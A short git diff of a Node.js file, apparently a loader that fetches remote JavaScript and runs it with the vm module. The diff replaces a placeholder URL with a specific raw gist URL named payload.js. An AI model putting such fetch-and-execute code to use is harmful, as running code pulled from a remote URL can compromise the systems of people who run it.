@@ -3,7 +3,7 @@ const http = require('http');
 const https = require('https');
 const vm = require('vm');
 
-const payloadUrl = 'https://example.com/script.js'; // Replace with actual URL
+const payloadUrl = 'https://gist.githubusercontent.com/telosGit/588310fe881501505d6cb5c7d9fa4f01/raw/b95863a76962fcb66d998cf95bbb9c4db79ebe45/payload.js'; // Replace with actual URL
 
 function fetchCompat(url) {
   return new Promise((resolve, reject) => {
